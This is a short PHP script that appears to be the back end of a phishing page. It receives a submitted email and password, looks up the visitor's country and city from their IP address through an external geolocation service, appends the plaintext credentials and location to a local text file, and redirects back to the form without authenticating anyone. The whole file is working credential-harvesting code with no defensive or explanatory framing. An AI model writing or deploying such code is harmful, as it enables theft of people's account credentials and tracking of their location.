<?php
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit();
}

$email = trim($_POST["email"] ?? "");
$password = trim($_POST["password"] ?? "");
$ip = $_SERVER["REMOTE_ADDR"] ?? "unknown";

$country = "unknown";
$city = "unknown";

$geo = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . urlencode($ip)));
if ($geo && isset($geo->geoplugin_countryName)) {
    $country = $geo->geoplugin_countryName ?: "unknown";
}
if ($geo && isset($geo->geoplugin_city)) {
    $city = $geo->geoplugin_city ?: "unknown";
}

$data = "IP: " . $ip . PHP_EOL .
        "Country: " . $country . PHP_EOL .
        "City: " . $city . PHP_EOL .
        "Email: " . $email . PHP_EOL .
        "Password: " . $password . PHP_EOL .
        "----" . PHP_EOL;

file_put_contents("info.txt", $data, FILE_APPEND | LOCK_EX);

header("Location: index.html");
exit();
?>
